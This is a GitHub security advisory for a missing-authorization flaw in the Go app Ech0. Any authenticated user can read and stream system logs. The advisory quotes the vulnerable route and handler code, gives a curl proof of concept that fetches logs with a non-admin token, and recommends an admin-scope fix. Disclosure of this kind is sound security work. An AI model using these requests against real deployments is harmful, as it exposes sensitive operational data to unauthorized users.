# [M] Ech0: Missing authorization on dashboard log endpoints allows low-privilege users to access sensitive system logs

## Summary
Severity: Medium
Advisory: GHSA-cp79-9mwr-wr49
CWE: CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-cp79-9mwr-wr49
Type: github-advisory

## Affected
- Go: `github.com/lin-snow/ech0` — affected >=0 <4.3.5

## Details
## Summary

Ech0 allows any authenticated user to read historical system logs and subscribe to live log streams because the dashboard log endpoints validate only that a JWT is present and valid, but do not require an administrator role or privileged scope.

## Impact

Any valid user session can access `GET /api/system/logs` and can also connect to the SSE and WebSocket log streaming endpoints. This exposes operational log data to low-privilege users. Depending on deployment and logging practices, the returned logs may include internal file paths, stack traces, admin activity, background job output, internal URLs, and other sensitive operational context. This creates a post-authentication information disclosure primitive that can materially aid follow-on attacks.

## Details

The issue is caused by an authorization gap between route registration, handler logic, and the service layer.

`internal/router/dashboard.go` registers the log endpoints on authenticated router groups, but does not apply any admin-only authorization middleware:

```go
func setupDashboardRoutes(appRouterGroup *AppRouterGroup, h *handler.Bundle) {
	// Auth
	appRouterGroup.AuthRouterGroup.GET("/system/logs", h.DashboardHandler.GetSystemLogs())
	appRouterGroup.AuthRouterGroup.GET("/system/logs/stream", h.DashboardHandler.SSESubscribeSystemLogs())
	appRouterGroup.WSRouterGroup.GET("/system/logs", h.DashboardHandler.WSSubscribeSystemLogs())
}
```

`internal/handler/dashboard/dashboard.go` returns log data directly and the SSE/WS handlers only check whether `jwtUtil.ParseToken(token)` succeeds:

```go
func (dashboardHandler *DashboardHandler) GetSystemLogs() gin.HandlerFunc {
	return res.Execute(func(ctx *gin.Context) res.Response {
		logs, err := dashboardHandler.dashboardService.GetSystemLogs(service.SystemLogQuery{
			Tail:    tail,
			Level:   ctx.Query("level"),
			Keyword: ctx.Query("keyword"),
		})
		if err != nil {
			return res.Response{Err: err}
		}
		return res.Response{
			Data: logs,
			Msg:  "获取系统日志成功",
		}
	})
}
```

`internal/service/dashboard/dashboard.go` exposes the log backend without adding a compensating admin check:

```go
func (s *DashboardService) GetSystemLogs(query SystemLogQuery) ([]logUtil.LogEntry, error) {
	tail := query.Tail
	if tail <= 0 {
		tail = 200
	}
	return logUtil.QueryLogFileTail(logUtil.CurrentLogFilePath(), tail, query.Level, query.Keyword)
}
```

Affected endpoints:

- `GET /api/system/logs`
- `GET /api/system/logs/stream?token=...`
- `GET /ws/system/logs?token=...`


## Proof of concept

### 1. Start the app

```bash
docker run -d \
  --name ech0 \
  -p 6277:6277 \
  -v /opt/ech0/data:/app/data \
  -e JWT_SECRET="Hello Echos" \
  sn0wl1n/ech0:latest
```

### 2. Initialize an owner account and register a normal user

```bash
curl -sS -X POST "http://127.0.0.1:6277/api/init/owner" \
  -H 'Content-Type: application/json' \
  -d '{"username":"owner","password":"ownerpass","email":"owner@example.com"}'

curl -sS -X POST "http://127.0.0.1:6277/api/register" \
  -H 'Content-Type: application/json' \
  -d '{"username":"winky","password":"winkypass","email":"winky@example.com"}'
```

### 3. Log in as the non-admin user and request the system log endpoint

```bash
winky_token=$(
  curl -sS -X POST "http://127.0.0.1:6277/api/login" \
    -H 'Content-Type: application/json' \
    -d '{"username":"winky","password":"winkypass"}' \
  | sed -n 's/.*"data":"\([^"]*\)".*/\1/p'
)

curl -sS "http://127.0.0.1:6277/api/system/logs" \
  -H "Authorization: Bearer $winky_token"
```

Observed response: the non-admin user receives 200 OK and a JSON response containing entries from `app.log`

<img width="1073" height="183" alt="image" src="https://github.com/user-attachments/assets/f0a836fa-121f-4fb7-a94c-92344d9aedd8" />


The same missing-authorization pattern also affects:

- `GET /api/system/logs/stream?token=<non-admin-token>`
- `GET /ws/system/logs?token=<non-admin-token>`


## Recommended fix

Require an explicit admin-only scope on all dashboard log routes and enforce the same requirement in the service layer.

Suggested change in `internal/router/dashboard.go`:

```go
import (
	"github.com/lin-snow/ech0/internal/handler"
	"github.com/lin-snow/ech0/internal/middleware"
	authModel "github.com/lin-snow/ech0/internal/model/auth"
)

func setupDashboardRoutes(appRouterGroup *AppRouterGroup, h *handler.Bundle) {
	appRouterGroup.AuthRouterGroup.GET(
		"/system/logs",
		middleware.RequireScopes(authModel.ScopeAdminSettings),
		h.DashboardHandler.GetSystemLogs(),
	)
	appRouterGroup.AuthRouterGroup.GET(
		"/system/logs/stream",
		middleware.RequireScopes(authModel.ScopeAdminSettings),
		h.DashboardHandler.SSESubscribeSystemLogs(),
	)
	appRouterGroup.WSRouterGroup.GET(
		"/system/logs",
		middleware.RequireScopes(authModel.ScopeAdminSettings),
		h.DashboardHandler.WSSubscribeSystemLogs(),
	)
}
```

Suggested defense-in-depth change in the service layer:

```go
func (s *DashboardService) GetSystemLogs(ctx context.Context, query SystemLogQuery) ([]logUtil.LogEntry, error) {
	if err := s.ensureAdmin(ctx); err != nil {
		return nil, err
	}

	tail := query.Tail
	if tail <= 0 {
		tail = 200
	}
	return logUtil.QueryLogFileTail(logUtil.CurrentLogFilePath(), tail, query.Level, query.Keyword)
}
```

## References
- https://github.com/lin-snow/Ech0/security/advisories/GHSA-cp79-9mwr-wr49
- https://github.com/lin-snow/Ech0
- https://github.com/lin-snow/Ech0/releases/tag/v4.3.5
